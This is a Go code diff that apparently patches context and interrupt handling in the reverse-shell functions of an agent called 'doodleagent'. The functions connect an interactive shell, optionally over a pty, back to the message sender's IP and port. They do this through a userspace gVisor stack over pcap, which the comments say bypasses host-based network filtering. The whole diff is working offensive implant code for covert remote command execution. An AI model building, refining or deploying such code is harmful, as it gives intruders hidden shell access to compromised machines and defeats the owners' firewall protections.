@@ -110,8 +110,9 @@ func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
 // This uses the pcapconn implementation of net.Conn
 // This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
 func OpenPcapReverseShell(msg *message.Message) (resultErr error) {
-	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
-	defer stop()
+	// FIXED: Use a standard background context for the stack allocation lifetime
+	// to prevent signal cancellation states from locking up internal gVisor stack workers.
+	ctx := context.Background()
 
 	targetIP := msg.SrcIP
 	targetPort, err := strconv.Atoi(msg.SrcPort)
@@ -143,6 +144,7 @@ func OpenPcapReverseShell(msg *message.Message) (resultErr error) {
 	if err != nil {
 		return err
 	}
+	// Defer stack cleanup safely
 	defer func() {
 		if vstack != nil {
 			vstack.Close()
@@ -165,9 +167,11 @@ func OpenPcapReverseShell(msg *message.Message) (resultErr error) {
 		return err
 	}
 
-	// FIXED: Removed the dangerous asynchronous conn.Close() goroutine entirely.
-	// We pass 'ctx' into the modified run function below to safely interrupt the execution pipeline.
-	return runPcapShellContext(ctx, exec.Command(getShell(), getShellInteractiveArgs()...), conn)
+	// Build the context specifically for managing the interactive shell runtime
+	shellCtx, shellStop := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer shellStop()
+
+	return runPcapShellContext(shellCtx, exec.Command(getShell(), getShellInteractiveArgs()...), conn)
 }
 
 // FIXED: Context-aware shell runner that cleanly interrupts on Ctrl+C
@@ -272,8 +276,7 @@ func runPcapShellPty(cmd *exec.Cmd, conn net.Conn) error {
 // This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
 // Spawns a pty. More risk--if pty is killed, so is doodleagent
 func OpenPcapReverseShellPty(msg *message.Message) (resultErr error) {
-	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
-	defer stop()
+	ctx := context.Background()
 
 	targetIP := msg.SrcIP
 	targetPort, err := strconv.Atoi(msg.SrcPort)
@@ -305,7 +308,6 @@ func OpenPcapReverseShellPty(msg *message.Message) (resultErr error) {
 	if err != nil {
 		return err
 	}
-	// Defer stack cleanup only after successful allocation
 	defer func() {
 		if vstack != nil {
 			vstack.Close()
@@ -324,14 +326,15 @@ func OpenPcapReverseShellPty(msg *message.Message) (resultErr error) {
 		return err
 	}
 
-	// Clear the deadline entirely so interactive sessions don't time out
 	if err := conn.SetDeadline(time.Time{}); err != nil {
 		return err
 	}
 
-	// FIXED: Removed the dangerous asynchronous conn.Close() goroutine entirely.
-	// Pass 'ctx' directly down to handle contextual termination safely without virtual stack deadlocks.
-	return runPcapShellPtyContext(ctx, exec.Command(getShell(), getShellInteractiveArgs()...), conn)
+	// Build the context specifically for managing the interactive shell runtime
+	shellCtx, shellStop := signal.NotifyContext(context.Background(), os.Interrupt)
+	defer shellStop()
+
+	return runPcapShellPtyContext(shellCtx, exec.Command(getShell(), getShellInteractiveArgs()...), conn)
 }
 
 func runPcapShellPtyContext(ctx context.Context, cmd *exec.Cmd, conn net.Conn) error {
